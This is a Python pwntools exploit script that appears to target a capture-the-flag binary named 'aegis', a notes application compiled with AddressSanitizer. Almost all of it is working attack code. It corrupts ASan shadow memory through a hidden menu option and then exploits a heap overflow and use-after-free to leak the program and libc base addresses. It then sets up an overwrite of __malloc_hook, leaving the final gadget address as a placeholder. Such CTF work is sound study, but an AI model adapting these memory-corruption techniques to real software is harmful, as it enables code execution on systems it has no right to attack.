#!/usr/bin/python
from pwn import *
context.binary = "./aegis"
context.arch = "amd64"
context.os = "linux"
#context.log_level='debug'
context.terminal  = ["tmux", "sp", "-h"]
# p = gdb.debug("./aegis", gdbscript='')
p = gdb.debug("./aegis", gdbscript='''
              ''')
              # b *(0x555555554000 + 0x1146d6)
                            # b *(0x555555554000 + 0x1146ec)
#p = process("./aegis")
#    b *(0x555555554000 + 0x114250)
          #    b *(0x555555554000 + 0x1145f0)
          #    b *(0x555555554000 + 0x1146d6)
          #    b *(0x555555554000 + 0x1146ec)
          #    b *(0x555555554000 + 0x1147e0)
          #    ''')
              # b *(0x555555554000 + 0x114357)
              # add_note b *(0x555555554000 + 0x114250)
              # update_note b *(0x555555554000 + 0x1145f0)
              # delete               b *(0x555555554000 + 0x1147e0)

def add_note(size, content, ID):
    p.sendline("1")
    print(p.recv())
    p.sendline("{}".format(size))
    print(p.recv())
    p.send("{}".format(content))
    print(p.recv())
    p.sendline("{}".format(ID))
    print(p.recv())

def show_note(index):
    p.sendline("2")
    print(p.recv())
    p.sendline("{}".format(index))
    return p.recv()

def update_note_sendline(index, new_content, new_ID):
    p.sendline("3")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())
    p.sendline("{}".format(new_content))
    print(p.recv())
    p.sendline("{}".format(new_ID))
    print(p.recv())

def update_note(index, new_content, new_ID):
    p.sendline("3")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())
    p.send("{}".format(new_content))
    print(p.recv())
    p.sendline("{}".format(new_ID))
    print(p.recv())

def delete_note(index):
    p.sendline("4")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())

def secret(addr):
    p.sendline("666")
    print(p.recv())
    p.sendline("{}".format(addr))
    print(p.recv())

def exit():
    p.sendline("5")
    print(p.recv())


def to_asan(addr):
    return ((addr >> 3) + 0x7fff8000)

print(p.recv())
VAL = 0xffffffffffffffff
# add_note(128, "a"*120, VAL)
# add_note(128, "b"*120, VAL)
# secret(0x0c187fff8018)
# update_note(0, "c"*(133), VAL)
# delete_note(1)
# add_note(128, "D"*120, VAL)p # update_note(0, "c"*(133), VAL)

# add_note(24, "a"*16, VAL)
# add_note(24, "b"*16, VAL)
add_note(16, "a"*8, VAL)
add_note(16, "b"*8, VAL)

addr = to_asan(0x602000000020)
print "magiccc", hex(addr)
secret(addr)

# do 1st update
update_note(0, 'C'*18, 0xffff)

# do 2nd update
payload  = 'd'*16 + '\x02'*3
payloadid = 0xffffffff02ffffff
update_note_sendline(0, payload, payloadid)

#POINTER at 0x602000000030
#TEXT AT 0x555555668ab0
delete_note(0)
add_note(16, "\x18" + "\x00" + "\x00" + "\x00" + "\x20" + "\x60" + "\x00" + "\x00", 0x00)
note_data = show_note(0)
note_data = note_data.split("Content:")
note_data = note_data[1][0:8]
note_data = (u64(note_data) >> 8) & 0xffffffffffff
cfi = note_data
text_base = note_data - 1133232
log.progress("Text Leak: {}".format((hex(text_base))))

update_note(2, "c"*(1)+"\n", VAL)
update_note(2, "c"*(2), 0xffff)
update_note(2, "c"*(4), 0xffff)
update_note(2, "c"*(6), 0xffff)
update_note(2, "c"*(8), 0xffff)
got_offset = 0x000000000347E28
update_note(2, p64(got_offset + text_base)[0:7] + "\n", cfi)
libc = show_note(0)
libc = libc.split("Content:")
libc = libc[1][0:8]
libc = (u64(libc) >> 8) & 0xffffffffffff
libc -= 526784
log.progress("LIBC: {}".format(hex(libc)))
malloc_hook_offset = 0x00000000003ebc30
update_note(2, "c"*(1)+"\n", VAL)
update_note(2, "c"*(2), 0xffff)
update_note(2, "c"*(4), 0xffff)
update_note(2, "c"*(6), 0xffff)
update_note(2, "c"*(8), 0xffff)
update_note(2, p64(libc+malloc_hook_offset)[0:7] + "\n", cfi)
one_gadget = 0x4141414141414141
# update_note(0, "a" + "\n", 0)
p.interactive()


